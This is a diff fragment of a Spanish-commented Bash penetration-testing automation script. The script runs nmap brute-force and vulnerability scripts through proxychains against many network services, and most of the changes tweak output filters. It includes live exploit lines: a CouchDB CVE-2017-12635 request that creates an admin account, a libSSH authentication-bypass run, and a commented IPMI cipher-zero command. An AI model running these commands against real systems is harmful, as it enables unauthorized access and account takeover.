-		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .enumeracion/"$ip"_hadoop_tasktracker.txt		
+		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .enumeracion/"$ip"_hadoop_tasktracker.txt		
 	done
 	insert_data
 fi
@@ -2129,11 +2137,11 @@ if [ -f servicios/proxy.txt ]
 
 		echo "$proxychains  nmap -Pn --script=socks-auth-info -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
 		$proxychains nmap -n -Pn --script=socks-auth-info -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"> .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"> .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 
 
 		echo "$proxychains  nmap -Pn --script=socks-brute -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
 		$proxychains nmap -n -Pn --script=socks-brute -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 
 
 		# echo socks5 10.10.10.10 1080 username password > nano /etc/proxychains4.conf
 
@@ -2299,7 +2307,7 @@ then
 		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms06025.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms06025.txt 
 		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_sambacry.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_sambacry.txt 
 		grep --color=never "|" logs/vulnerabilidades/"$ip"_445_ms09050.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|NOT_FOUND" > .vulnerabilidades/"$ip"_445_ms09050.txt
-		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt | egrep -iv "Enter WORKGROUP|password for|Unknown parameter" > .vulnerabilidades/"$ip"_445_nullsession.txt 2>/dev/null
+		grep ":" logs/vulnerabilidades/"$ip"_445_nullsession.txt 2>/dev/null | egrep -iv "Enter WORKGROUP|password for|Unknown parameter" > .vulnerabilidades/"$ip"_445_nullsession.txt 
 		         
 		grep --color=never "not required" logs/vulnerabilidades/"$ip"_445_smb2Security.txt > .vulnerabilidades/"$ip"_445_smb2Security.txt
 		egrep --color=never "READ|WRITE" logs/vulnerabilidades/"$ip"_445_compartidoSMB.txt | sort | uniq | grep -v '\$' > .vulnerabilidades/"$ip"_445_compartidoSMB.txt		
@@ -2412,7 +2420,7 @@ then
 			echo -e "\t[+] Probando vulnerabilidad cipher-zero"
 			echo "$proxychains  nmap -sU --script ipmi-cipher-zero -p 623 -Pn -n $ip"  > logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
 			$proxychains  nmap -sU --script ipmi-cipher-zero -p $port -Pn -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 2>/dev/null 
-			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
+			grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_cipherZeroIPMI.txt 	
 			
 			#exploit
 			#ipmitool -I lanplus -C 0 -H 192.168.200.5 -U admin -P root user list 
@@ -2440,7 +2448,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "$proxychains nmap -n -sT -p $port -Pn --script=mongodb-databases,mongodb-info $ip"  > logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
 		$proxychains nmap -n -sT -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null 
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_mongo_info.txt 				
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_mongo_info.txt 				
 	done	
 	#insert clean data	
 	insert_data	
@@ -2457,7 +2465,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"
 		echo "$proxychains nmap -Pn -n -sT -p $port --script=couchdb-databases,couchdb-stats $ip" >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
 		$proxychains nmap -Pn -n -sT -p $port --script=couchdb-databases $ip >> logs/vulnerabilidades/"$ip"_mongo_info.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_mongo_info.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_mongo_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_mongo_info.txt
 
 		#CVE-2017-12635
 		$proxychains curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}' $ip:$port/_users/org.couchdb.user:hacker -H "Content-Type:application/json" > logs/vulnerabilidades/"$ip"_"$port"_privEsc.txt
@@ -2480,7 +2488,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "$proxychains nmap -Pn -sT -n $ip --script=x11-access.nse" > logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
 		$proxychains nmap -Pn -sT -n $ip --script=x11-access.nse >> logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt 2>/dev/null 
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_x11Access.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_x11Access.txt 
 
 		#xdpyinfo -display <ip>:<display>
 		#xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
@@ -2502,11 +2510,11 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "$proxychains nmap -Pn -n -sT -p $port $ip --script=nfs-ls.nse" > logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
 		$proxychains nmap -Pn -n -sT -p $port $ip --script=nfs-ls.nse >> logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 2>/dev/null 
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_compartidoNFS.txt 
 		
 		echo "$proxychains nmap -n -sT -p $port $ip --script=rpcinfo" > logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
 		$proxychains nmap -Pn -n -sT -p $port $ip --script=rpcinfo >> logs/enumeracion/"$ip"_"$port"_NFSinfo.txt 2>/dev/null 
-		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_"$port"_NFSinfo.txt
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_NFSinfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_"$port"_NFSinfo.txt
 
 		$proxychains rusers -l $ip > logs/enumeracion/"$ip"_"$port"_rusers.txt 2>/dev/null
 		egrep "console|tty" logs/enumeracion/"$ip"_"$port"_rusers.txt > .enumeracion/"$ip"_"$port"_rusers.txt
@@ -2530,7 +2538,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"		
 		echo "$proxychains  nmap -Pn -n -sT -p $port --script=msrpc-enum $ip" > logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
 		$proxychains nmap -Pn -n -p $port --script=msrpc-enum $ip>> logs/enumeracion/"$ip"_"$port"_msrpc.txt 2>/dev/null 
-		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_msrpc.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_"$port"_msrpc.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_msrpc.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_"$port"_msrpc.txt 
 		
 	done	
 	insert_data	
@@ -2576,7 +2584,7 @@ then
 		echo -e "[+] Escaneando $ip:$port"			
 		echo "$proxychains  nmap -n -sT -p $port $ip --script redis-info" > logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
 		$proxychains nmap -Pn -n -p $port $ip --script redis-info >> logs/enumeracion/"$ip"_redis_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed"  > .enumeracion/"$ip"_redis_info.txt						
+		grep --color=never "|" logs/enumeracion/"$ip"_redis_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT"  > .enumeracion/"$ip"_redis_info.txt						
 		#A exploit for Redis(<=5.0.5) RCE redis-exploit.sh
 
 		echo "redis-cli -h $ip config get '*'" > logs/enumeracion/"$ip"_redis_config.txt 2>/dev/null
@@ -2620,7 +2628,7 @@ then
 		echo -e "[+] Nmap vulnerabilities"
 		echo "$proxychains  nmap -Pn -n -p $port --script rmi-vuln-classloader $ip" > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
 		$proxychains nmap -Pn -n -p $port --script rmi-vuln-classloader $ip>> logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_rmiVuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_rmiVuln.txt
 
 		echo -e "[+] rmg vulnerabilities"
 		$proxychains rmg.sh enum $ip $port > logs/vulnerabilidades/"$ip"_"$port"_rmiVuln2.txt
@@ -2651,7 +2659,7 @@ then
 	
 	echo "$proxychains  nmap -n -sT -p $port --script=telnet-ntlm-info.nse $ip" > logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
 	$proxychains nmap -Pn -n -sT -p $port --script=telnet-ntlm-info.nse $ip >> logs/enumeracion/"$ip"_"$port"_telnetInfo.txt 2>/dev/null
-	grep --color=never "|" logs/enumeracion/"$ip"_"$port"_telnetInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" >> .enumeracion/"$ip"_"$port"_telnetInfo.txt
+	grep --color=never "|" logs/enumeracion/"$ip"_"$port"_telnetInfo.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" >> .enumeracion/"$ip"_"$port"_telnetInfo.txt
 	
 	
 	echo -e "\t[+] Probando passwords"	
@@ -2780,11 +2788,12 @@ then
 		#enumeracionUsuariosSSH2.py -U $common_user_list  $ip > logs/vulnerabilidades/"$ip"_"$port"_enumeracionUsuariosSSH2.txt &
 
 		#SSHBypass
-		echo -e "\t[+] Probando vulnerabilidad libSSH bypass"	
+		
 		#grep --color=never "libssh" 
-		egrep -iq "libssh" .banners/"$ip"_22.txt  2>/dev/null
+		egrep -iq "libssh" .banners/"$ip"_22.txt | egrep -v "dropbear" 2>/dev/null
 		greprc=$?
 		if [[ $greprc -eq 0 ]] ; then			
+			echo -e "\t[+] Probando vulnerabilidad libSSH bypass"	
 			$proxychains libsshauthbypass.py --host $ip --port 22 --command "whoami" > logs/vulnerabilidades/"$ip"_22_SSHBypass.txt 
 			
 			egrep -iq "Not Vulnerable|Error" logs/vulnerabilidades/"$ip"_22_SSHBypass.txt  2>/dev/null
@@ -2885,14 +2894,14 @@ then
 		echo -e "\t[+] Verificando info VNC"
 		echo "$proxychains  nmap -n -Pn -sT -p $port --script vnc-info,vnc-title $ip" > logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
 		$proxychains nmap -Pn -n -p $port --script vnc-info,realvnc-auth-bypass,vnc-title $ip >> logs/enumeracion/"$ip"_"$port"_info.txt 2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" >> .enumeracion/"$ip"_"$port"_info.txt
-		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt
+		grep --color=never "|" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" >> .enumeracion/"$ip"_"$port"_info.txt
+		grep -i "server does not require authentication" logs/enumeracion/"$ip"_"$port"_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" >> .vulnerabilidades/"$ip"_"$port"_noauth.txt
 
 
 		echo -e "\t[+] Verificando Vulnerabilidad de REALVNC"
 		echo "$proxychains  nmap -n -Pn -sT -p $port --script realvnc-auth-bypass $ip" > logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
 		$proxychains nmap -Pn -n -p $port --script realvnc-auth-bypass $ip >> logs/vulnerabilidades/"$ip"_vnc_bypass.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" >> .vulnerabilidades/"$ip"_vnc_bypass.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_vnc_bypass.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" >> .vulnerabilidades/"$ip"_vnc_bypass.txt
 
 		#vncpwd <vnc password file>
 
@@ -2916,7 +2925,7 @@ then
 		echo -e "\t[+] Obteniendo información de MS-SQL"
 		echo "$proxychains  nmap -Pn -n -sV -sT -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip" >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
 		$proxychains nmap -Pn -n -sV -sT -p 1433 --host-timeout 10s --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER  $ip >> logs/enumeracion/"$ip"_1434_info.txt  2>/dev/null
-		grep --color=never "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .enumeracion/"$ip"_1434_info.txt 
+		grep --color=never "|" logs/enumeracion/"$ip"_1434_info.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .enumeracion/"$ip"_1434_info.txt 
 					
 		echo ""
  	done <servicios/mssql.txt
@@ -3057,15 +3066,15 @@ then
 		echo -e "\t[+] Probando vulnerabilidad con nmap"				
 		echo "$proxychains  nmap --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
 		$proxychains nmap -n -Pn --script oracle-brute -p $port --script-args oracle-brute.sid=ORCL $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleCreds.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_oracleCreds.txt	
 
 		echo "$proxychains  nmap -p $port --script=oracle-sid-brute $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
 		$proxychains nmap -n -Pn -p $port --script=oracle-sid-brute $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_oracleSids.txt	
 
 		echo "$proxychains  nmap -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip" > logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
 		$proxychains nmap -Pn -p $port --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n $ip >> logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_oracleStealth.txt 
 	
 	
 		echo -e "\t[+] Probando vulnerabilidad con tnscmd10g"				
@@ -3108,7 +3117,7 @@ then
 		echo -e "\t[+] Probando vulnerabilidad"				
 		echo "$proxychains  nmap -n -sT -p $port --script http-vuln-cve2017-5689 $ip" > logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
 		$proxychains nmap -Pn -n -sT -p $port --script http-vuln-cve2017-5689 $ip >> logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt 2>/dev/null
-		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
+		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_intelVuln.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT" > .vulnerabilidades/"$ip"_"$port"_intelVuln.txt
 													 
 		 echo ""
  	done <servicios/intel.txt	
@@ -3265,7 +3274,7 @@ then
 		while true; do
 			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
 			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 			
-			if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 										
+			if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
 				echo -e "[+] Escaneando $ip:$port"	
 				echo -e "\t[+] Revisando server-status"
 				curl --max-time 2 http://$ip:$port/server-status 2>/dev/null | grep --color=never nowrap | sed 's/<\/td>//g' | sed 's/<td nowrap>/;/g' | sed 's/<\/td><td>//g'| sed 's/<\/td><\/tr>//g' | sed 's/amp;//g' > .enumeracion/"$ip"_"$port"_serverStatus.txt 
@@ -3350,7 +3359,7 @@ then
 							noEscaneado=1
 						fi	
 						
-						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out" .enumeracion/"$subdominio"_"$port"_webData.txt
+						egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused|GoAhead-Webs" .enumeracion/"$subdominio"_"$port"_webData.txt
 						hostOK=$?	
 						echo -e "\t\t hostOK $hostOK"
 						
@@ -3377,7 +3386,7 @@ then
     							
 
   							###  if the server is apache ######
-							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
 								enumeracionApache "http" $subdominio $port								
@@ -3388,7 +3397,7 @@ then
 							
 											
 							#######  if the server is SharePoint ######
-							grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+							grep -i SharePoint .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
 								enumeracionSharePoint "http" $subdominio $port								
@@ -3399,7 +3408,7 @@ then
 							
 
 							#######  if the server is IIS ######
-							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|SharePoint"  # no redirecciona
+							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|SharePoint"  # no redirecciona
 							greprc=$?
 							if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
 								enumeracionIIS "http" $subdominio $port								
@@ -3481,7 +3490,7 @@ then
 				egrep -iq $md5 webClone/checksumsEscaneados.txt
 				noEscaneado=$?	
 																																			
-				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out" .enumeracion/"$ip"_"$port"_webData.txt
+				egrep -qi "301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused" .enumeracion/"$ip"_"$port"_webData.txt
 				hostOK=$?	
 						
 				egrep -qi "403" .enumeracion/"$ip"_"$port"_webData.txt #403 - Prohibido: acceso denegado.
@@ -3505,7 +3514,7 @@ then
 					enumeracionCMS "http" $ip $port
 
 					#######  if the server is SharePoint ######
-					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
+					grep -i SharePoint .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
 					greprc=$?
 					if [[ $greprc -eq 0  ]];then # si el banner es IIS 																															
 						enumeracionSharePoint "http" $ip $port						
@@ -3515,7 +3524,7 @@ then
 					####################################	
 
 					#######  if the server is IIS ######
-					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare"  # no redirecciona
+					grep -i IIS .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|SharePoint|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|Cloudflare"  # no redirecciona
 					greprc=$?
 					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es IIS y no se enumero antes						
 						enumeracionIIS "http" $ip $port											
@@ -3527,7 +3536,7 @@ then
 		
 		
 					#######  if the server is tomcat ######					
-					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|Cloudflare"  # no redirecciona
+					egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$ip"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|Cloudflare"  # no redirecciona
 					greprc=$?				
